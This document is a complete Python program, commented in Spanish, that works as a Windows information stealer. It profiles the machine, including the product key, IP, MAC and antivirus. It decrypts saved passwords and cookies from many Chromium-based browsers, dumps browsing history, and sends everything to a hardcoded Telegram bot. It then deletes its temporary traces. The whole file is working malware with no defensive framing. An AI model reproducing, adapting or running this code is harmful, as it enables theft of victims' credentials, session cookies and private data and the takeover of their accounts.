#!/usr/bin/env python3
import os
import sqlite3
import json
import base64
import shutil
import zipfile
import io
import time
import subprocess
import threading
import logging
from typing import Optional

import requests
from Crypto.Cipher import AES
import win32crypt
import psutil
from screeninfo import get_monitors
import pycountry

# Importamos para programar la eliminación de archivos en el próximo reinicio
import win32api
import win32con

# Configuración del logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

# Configuración mediante variables de entorno
BOT_TOKEN = os.getenv("BOT_TOKEN", "7574400169:AAHXLi2hQbs2CMbnbInso-Aw9xE_cSobaRM")
CHAT_ID = os.getenv("CHAT_ID", "6686157223")


def safe_remove(file_path: str) -> None:
    """
    Intenta eliminar un archivo; si falla por bloqueo (PermissionError),
    lo programa para eliminarse en el próximo reinicio usando MoveFileEx.
    """
    try:
        os.remove(file_path)
        logging.info("Archivo %s eliminado correctamente.", file_path)
    except PermissionError as e:
        logging.warning("No se pudo eliminar %s: %s", file_path, e)
        try:
            win32api.MoveFileEx(file_path, None, win32con.MOVEFILE_DELAY_UNTIL_REBOOT)
            logging.info(
                "El archivo %s se ha programado para eliminar en el próximo reinicio.",
                file_path,
            )
        except Exception as e2:
            logging.error(
                "No se pudo programar la eliminación del archivo %s: %s", file_path, e2
            )


def run_command(command: str) -> str:
    """
    Ejecuta un comando en PowerShell y devuelve su salida.
    """
    try:
        result = subprocess.run(
            f'powershell -Command "{command}"',
            shell=True,
            capture_output=True,
            text=True,
            check=True,
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        logging.error("Error al ejecutar el comando: %s. %s", command, e)
        return "Unknown"


class TelegramClient:
    """Clase auxiliar para enviar mensajes y archivos a Telegram."""

    def __init__(self, bot_token: str = BOT_TOKEN, chat_id: str = CHAT_ID):
        self.bot_token = bot_token
        self.chat_id = chat_id

    def send_message(self, message: str) -> Optional[requests.Response]:
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        for attempt in range(3):
            try:
                response = requests.post(
                    url,
                    data={
                        "chat_id": self.chat_id,
                        "text": message,
                        "parse_mode": "Markdown",
                    },
                    timeout=10,
                )
                if response.status_code == 200:
                    logging.info("Mensaje enviado correctamente a Telegram.")
                    return response
                else:
                    logging.warning(
                        "Fallo al enviar mensaje. Código: %s", response.status_code
                    )
            except requests.RequestException as e:
                logging.warning("Intento %d fallido: %s", attempt + 1, e)
                time.sleep(5)
        logging.error("Se alcanzó el número máximo de intentos para enviar el mensaje.")
        return None

    def send_file(self, file_path: str) -> Optional[requests.Response]:
        url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
        for attempt in range(3):
            try:
                with open(file_path, "rb") as file:
                    response = requests.post(
                        url,
                        files={"document": file},
                        data={"chat_id": self.chat_id},
                        timeout=10,
                    )
                if response.status_code == 200:
                    logging.info("Archivo enviado correctamente a Telegram.")
                    return response
                else:
                    logging.warning(
                        "Fallo al enviar archivo. Código: %s", response.status_code
                    )
            except requests.RequestException as e:
                logging.warning("Intento %d fallido: %s", attempt + 1, e)
                time.sleep(5)
        logging.error("Se alcanzó el número máximo de intentos para enviar el archivo.")
        return None


class PcInfo:
    """Extrae y envía información del sistema del PC."""

    def __init__(self):
        self.telegram_client = TelegramClient()
        self.get_system_info()

    def get_country_code(self, country_name: str) -> str:
        try:
            country = pycountry.countries.lookup(country_name)
            return country.alpha_2.lower()
        except LookupError:
            return "unknown"

    def get_all_avs(self) -> str:
        try:
            output = run_command(
                "(Get-CimInstance -Namespace 'Root\\SecurityCenter2' -ClassName AntivirusProduct).displayName"
            )
            lines = output.splitlines()
            av_list = [line.strip() for line in lines if line.strip()]
            return ", ".join(av_list) if av_list else "No antivirus found"
        except Exception as e:
            logging.error("Error al recuperar antivirus: %s", e)
            return "Error al recuperar antivirus"

    def get_screen_resolution(self) -> str:
        try:
            monitors = get_monitors()
            resolutions = [f"{m.width}x{m.height}" for m in monitors]
            return ", ".join(resolutions) if resolutions else "Unknown"
        except Exception as e:
            logging.error("Error al obtener resolución de pantalla: %s", e)
            return "Unknown"

    def get_system_info(self):
        try:
            os_name = run_command(
                "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"
            )
            cpu_name = run_command("(Get-CimInstance -ClassName Win32_Processor).Name")
            gpu_name = run_command(
                "(Get-CimInstance -ClassName Win32_VideoController).Name"
            )
            ram_raw = run_command(
                "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"
            )
            ram = (
                str(round(int(ram_raw) / (1024**3))) if ram_raw.isdigit() else "Unknown"
            )
            model = run_command(
                "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"
            )
            uuid = run_command(
                "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"
            )
            product_key = run_command(
                "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"
            )
            product_key = (
                product_key
                if product_key
                else "No se pudo obtener la clave del producto"
            )

            r = requests.get("http://ip-api.com/json/?fields=225545", timeout=10).json()
            country = r.get("country", "Unknown")
            proxy = r.get("proxy", False)
            ip = r.get("query", "Unknown")

            interfaces = psutil.net_if_addrs()
            _, addrs = next(iter(interfaces.items()))
            mac = addrs[0].address if addrs else "Unknown"

            screen_resolution = self.get_screen_resolution()
            username = os.getenv("UserName", "Unknown")
            hostname = os.getenv("COMPUTERNAME", "Unknown")

            message = (
                f"**PC Username:** `{username}`\n"
                f"**PC Name:** `{hostname}`\n"
                f"**Model:** `{model}`\n"
                f"**Screen Resolution:** `{screen_resolution}`\n"
                f"**OS:** `{os_name}`\n"
                f"**Product Key:** `{product_key}`\n\n"
                f"**IP:** `{ip}`\n"
                f"**Country:** `{country}`\n"
                f"**Proxy:** `{'Sí' if proxy else 'No'}`\n"
                f"**MAC:** `{mac}`\n"
                f"**UUID:** `{uuid}`\n\n"
                f"**CPU:** `{cpu_name}`\n"
                f"**GPU:** `{gpu_name}`\n"
                f"**RAM:** `{ram}GB`\n\n"
                f"**Antivirus:** `{self.get_all_avs()}`"
            )

            log_file = "tasklist.txt"
            with open(log_file, "w", encoding="utf-8") as f:
                tasklist_output = run_command("tasklist")
                installed_apps_output = run_command("wmic product get name")
                f.write("Lista de aplicaciones en ejecución:\n")
                f.write(tasklist_output)
                f.write("\n\nLista de software instalado:\n")
                f.write(installed_apps_output)

            self.telegram_client.send_message(message)
            self.telegram_client.send_file(log_file)

            safe_remove(log_file)
        except Exception as e:
            error_message = f"Se produjo un error: {e}"
            self.telegram_client.send_message(error_message)
            logging.error("Error en get_system_info: %s", e)


class Browser:
    """Extrae contraseñas e historial de navegadores y los envía por Telegram."""

    def __init__(self):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.browser_paths = {
            "kometa": os.path.join(self.appdata, "Kometa", "User Data"),
            "orbitum": os.path.join(self.appdata, "Orbitum", "User Data"),
            "cent-browser": os.path.join(self.appdata, "CentBrowser", "User Data"),
            "7star": os.path.join(self.appdata, "7Star", "7Star", "User Data"),
            "sputnik": os.path.join(self.appdata, "Sputnik", "Sputnik", "User Data"),
            "vivaldi": os.path.join(self.appdata, "Vivaldi", "User Data"),
            "google-chrome-sxs": os.path.join(
                self.appdata, "Google", "Chrome SxS", "User Data"
            ),
            "google-chrome": os.path.join(
                self.appdata, "Google", "Chrome", "User Data"
            ),
            "epic-privacy-browser": os.path.join(
                self.appdata, "Epic Privacy Browser", "User Data"
            ),
            "microsoft-edge": os.path.join(
                self.appdata, "Microsoft", "Edge", "User Data"
            ),
            "uran": os.path.join(self.appdata, "uCozMedia", "Uran", "User Data"),
            "yandex": os.path.join(
                self.appdata, "Yandex", "YandexBrowser", "User Data"
            ),
            "brave": os.path.join(
                self.appdata, "BraveSoftware", "Brave-Browser", "User Data"
            ),
            "iridium": os.path.join(self.appdata, "Iridium", "User Data"),
            "opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "opera-gx": os.path.join(self.roaming, "Opera Software", "Opera GX Stable"),
            "coc-coc": os.path.join(self.appdata, "CocCoc", "Browser", "User Data"),
        }
        self.profiles = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]
        self.create_zip_file()
        self.send_zip_via_telegram("password_full.zip")
        safe_remove("password_full.zip")

    def get_encryption_key(self, browser_path: str) -> Optional[bytes]:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Eliminar el prefijo DPAPI
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            logging.error("Error al obtener la clave de encriptación: %s", e)
            return None

    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> Optional[str]:
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        except Exception as e:
            logging.error("Error al desencriptar contraseña: %s", e)
            return None

    def extract_passwords(self, zip_file: zipfile.ZipFile):
        for browser, path in self.browser_paths.items():
            if not os.path.exists(path):
                continue
            for profile in self.profiles:
                login_db_path = os.path.join(path, profile, "Login Data")
                if not os.path.exists(login_db_path):
                    continue
                tmp_db_path = os.path.join(
                    os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db"
                )
                try:
                    shutil.copyfile(login_db_path, tmp_db_path)
                    with sqlite3.connect(tmp_db_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT origin_url, username_value, password_value FROM logins"
                        )
                        key = self.get_encryption_key(path)
                        if not key:
                            continue
                        password_data = io.StringIO()
                        password_data.write(
                            f"Browser: {browser} | Profile: {profile}\n"
                        )
                        password_data.write("=" * 120 + "\n")
                        password_data.write(
                            f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n"
                        )
                        password_data.write("=" * 120 + "\n")
                        for row in cursor.fetchall():
                            origin_url, username, encrypted_pwd = row
                            decrypted = self.decrypt_password(encrypted_pwd, key)
                            if username and decrypted:
                                password_data.write(
                                    f"{origin_url:<60} | {username:<30} | {decrypted:<30}\n"
                                )
                        zip_file.writestr(
                            f"browser/{browser}_passwords_{profile}.txt",
                            password_data.getvalue(),
                        )
                except Exception as e:
                    logging.error(
                        "Error extrayendo contraseñas para %s - %s: %s",
                        browser,
                        profile,
                        e,
                    )
                finally:
                    safe_remove(tmp_db_path)

    def extract_history(self, zip_file: zipfile.ZipFile):
        for browser, path in self.browser_paths.items():
            if not os.path.exists(path):
                continue
            for profile in self.profiles:
                history_db_path = os.path.join(path, profile, "History")
                if not os.path.exists(history_db_path):
                    continue
                tmp_db_path = os.path.join(
                    os.getenv("TEMP"), f"{browser}_{profile}_History.db"
                )
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                    with sqlite3.connect(tmp_db_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT url, title, visit_count, last_visit_time FROM urls"
                        )
                        history_data = io.StringIO()
                        history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                        history_data.write("=" * 120 + "\n")
                        history_data.write(
                            f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n"
                        )
                        history_data.write("=" * 120 + "\n")
                        for row in cursor.fetchall():
                            url, title, visit_count, last_visit_time = row
                            history_data.write(
                                f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n"
                            )
                        zip_file.writestr(
                            f"browser/{browser}_history_{profile}.txt",
                            history_data.getvalue(),
                        )
                except Exception as e:
                    logging.error(
                        "Error extrayendo historial para %s - %s: %s",
                        browser,
                        profile,
                        e,
                    )
                finally:
                    safe_remove(tmp_db_path)

    def create_zip_file(self) -> None:
        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_history(zip_file)

    def send_zip_via_telegram(self, file_path: str) -> None:
        client = TelegramClient()
        client.send_file(file_path)


class Browsers:
    """Extrae datos adicionales de navegadores (contraseñas, cookies, historial, tarjetas de crédito) usando hilos."""

    def __init__(self):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.browsers_paths = {
            "kometa": os.path.join(self.appdata, "Kometa", "User Data"),
            "orbitum": os.path.join(self.appdata, "Orbitum", "User Data"),
            "cent-browser": os.path.join(self.appdata, "CentBrowser", "User Data"),
            "7star": os.path.join(self.appdata, "7Star", "7Star", "User Data"),
            "sputnik": os.path.join(self.appdata, "Sputnik", "Sputnik", "User Data"),
            "vivaldi": os.path.join(self.appdata, "Vivaldi", "User Data"),
            "google-chrome-sxs": os.path.join(
                self.appdata, "Google", "Chrome SxS", "User Data"
            ),
            "google-chrome": os.path.join(
                self.appdata, "Google", "Chrome", "User Data"
            ),
            "epic-privacy-browser": os.path.join(
                self.appdata, "Epic Privacy Browser", "User Data"
            ),
            "microsoft-edge": os.path.join(
                self.appdata, "Microsoft", "Edge", "User Data"
            ),
            "uran": os.path.join(self.appdata, "uCozMedia", "Uran", "User Data"),
            "yandex": os.path.join(
                self.appdata, "Yandex", "YandexBrowser", "User Data"
            ),
            "brave": os.path.join(
                self.appdata, "BraveSoftware", "Brave-Browser", "User Data"
            ),
            "iridium": os.path.join(self.appdata, "Iridium", "User Data"),
            "opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "opera-gx": os.path.join(self.roaming, "Opera Software", "Opera GX Stable"),
            "coc-coc": os.path.join(self.appdata, "CocCoc", "Browser", "User Data"),
        }
        self.profiles = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]
        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
        self.masterkey = None
        self.process_all_browsers()

    def process_all_browsers(self):
        threads = []
        for name, path in self.browsers_paths.items():
            if not os.path.isdir(path):
                continue
            local_state_path = os.path.join(path, "Local State")
            self.masterkey = self.get_master_key(local_state_path)
            functions = [self.cookies, self.history, self.passwords, self.credit_cards]
            for profile in self.profiles:
                for func in functions:
                    thread = threading.Thread(
                        target=self.process_browser_data,
                        args=(name, path, profile, func),
                    )
                    thread.start()
                    threads.append(thread)
        for thread in threads:
            thread.join()
        self.create_zip_and_send()

    def process_browser_data(self, name: str, path: str, profile: str, func):
        try:
            func(name, path, profile)
        except Exception as e:
            logging.error(
                "Error procesando %s para %s en %s: %s", name, profile, func.__name__, e
            )

    def get_master_key(self, local_state_path: str) -> Optional[bytes]:
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[
                1
            ]
            return master_key
        except Exception as e:
            logging.error("Error obteniendo master key: %s", e)
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> Optional[str]:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        except Exception as e:
            logging.error("Error al desencriptar contraseña: %s", e)
            return None

    def passwords(self, name: str, path: str, profile: str):
        login_data_path = (
            os.path.join(path, profile, "Login Data")
            if name not in ["opera", "opera-gx"]
            else os.path.join(path, "Login Data")
        )
        if not os.path.isfile(login_data_path):
            return
        try:
            with sqlite3.connect(login_data_path) as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                )
                password_file_path = os.path.join(
                    self.temp_path, "Browser", "passwords.txt"
                )
                mode = (
                    "a"
                    if os.path.exists(password_file_path)
                    and os.path.getsize(password_file_path) > 0
                    else "w"
                )
                with open(password_file_path, mode, encoding="utf-8") as f:
                    if mode == "w":
                        f.write("Website | Username | Password\n\n")
                    for row in cursor.fetchall():
                        url, username, encrypted_pwd = row
                        if not (url and username and encrypted_pwd):
                            continue
                        password = self.decrypt_password(encrypted_pwd, self.masterkey)
                        f.write(f"{url} | {username} | {password}\n")
        except Exception as e:
            logging.error(
                "Error extrayendo contraseñas para %s - %s: %s", name, profile, e
            )

    def cookies(self, name: str, path: str, profile: str):
        cookies_path = (
            os.path.join(path, profile, "Network", "Cookies")
            if name not in ["opera", "opera-gx"]
            else os.path.join(path, "Network", "Cookies")
        )
        if not os.path.isfile(cookies_path):
            return
        temp_cookies = os.path.join(self.temp_path, f"{name}_{profile}_Cookies")
        try:
            shutil.copy2(cookies_path, temp_cookies)
            with sqlite3.connect(temp_cookies) as conn:
                cursor = conn.cursor()
                cookies_file_path = os.path.join(
                    self.temp_path, "Browser", "cookies.txt"
                )
                with open(cookies_file_path, "a", encoding="utf-8") as f:
                    f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
                    query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"
                    for res in cursor.execute(query).fetchall():
                        (
                            host_key,
                            cookie_name,
                            path_val,
                            encrypted_value,
                            expires_utc,
                        ) = res
                        value = self.decrypt_password(encrypted_value, self.masterkey)
                        if host_key and cookie_name and value:
                            f.write(
                                f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path_val}\t"
                                f"{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{cookie_name}\t{value}\n"
                            )
        except Exception as e:
            logging.error("Error extrayendo cookies para %s - %s: %s", name, profile, e)
        finally:
            safe_remove(temp_cookies)

    def history(self, name: str, path: str, profile: str):
        history_path = os.path.join(path, profile, "History")
        if not os.path.exists(history_path):
            return
        tmp_db_path = os.path.join(os.getenv("TEMP"), f"{name}_{profile}_History.db")
        try:
            shutil.copyfile(history_path, tmp_db_path)
            with sqlite3.connect(tmp_db_path) as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT url, title, visit_count, last_visit_time FROM urls"
                )
                history_file_path = os.path.join(
                    self.temp_path, "Browser", "history.txt"
                )
                mode = (
                    "a"
                    if os.path.exists(history_file_path)
                    and os.path.getsize(history_file_path) > 0
                    else "w"
                )
                with open(history_file_path, mode, encoding="utf-8") as f:
                    if mode == "w":
                        f.write("URL | Title | Visit Count | Last Visit Time\n\n")
                    for row in cursor.fetchall():
                        url, title, visit_count, last_visit_time = row
                        f.write(
                            f"{url} | {title} | {visit_count} | {last_visit_time}\n"
                        )
        except Exception as e:
            logging.error(
                "Error extrayendo historial para %s - %s: %s", name, profile, e
            )
        finally:
            safe_remove(tmp_db_path)

    def credit_cards(self, name: str, path: str, profile: str):
        # Funcionalidad pendiente para extraer datos de tarjetas de crédito.
        pass

    def create_zip_and_send(self):
        zip_file_name = os.path.join(self.temp_path, "BrowserData.zip")
        with zipfile.ZipFile(zip_file_name, "w") as zip_file:
            for foldername, _, filenames in os.walk(
                os.path.join(self.temp_path, "Browser")
            ):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    arcname = os.path.relpath(
                        file_path, os.path.join(self.temp_path, "Browser")
                    )
                    zip_file.write(file_path, arcname)
        client = TelegramClient()
        client.send_file(zip_file_name)
        safe_remove(zip_file_name)


if __name__ == "__main__":
    # Extraer y enviar información del sistema
    PcInfo()
    # Extraer contraseñas e historial de navegadores y enviarlos
    Browser()
    # Extraer datos adicionales de navegadores con hilos
    Browsers()
